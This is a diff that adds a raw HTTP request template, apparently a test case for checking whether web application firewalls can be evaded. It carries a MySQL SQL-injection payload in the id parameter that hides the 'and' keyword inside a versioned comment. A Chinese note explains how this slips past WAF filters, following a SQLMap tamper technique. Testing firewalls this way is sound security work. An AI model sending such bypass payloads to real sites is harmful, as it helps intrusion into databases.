@@ -1,0 +1,13 @@
+# @name: MySQL版本注释隐藏关键字
+# @tags: get,sqli,mysql,versioned-comment,id,bypass
+# @color: blue
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: mysql_versioned_comment
+# @intent.param: id
+# @intent.payload: id=1'/*!50000and*/'a'='a
+# @note: MySQL 版本注释 /*!50000...*/ 仅在 MySQL/MariaDB>=5.00 解析执行，多数 WAF 不还原其内关键字，可隐藏 union/select/and（SQLMap halfversionedmorekeywords 思路）。payload: id=1' and 'a'='a
+GET /?id=1'/*!50000and*/'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
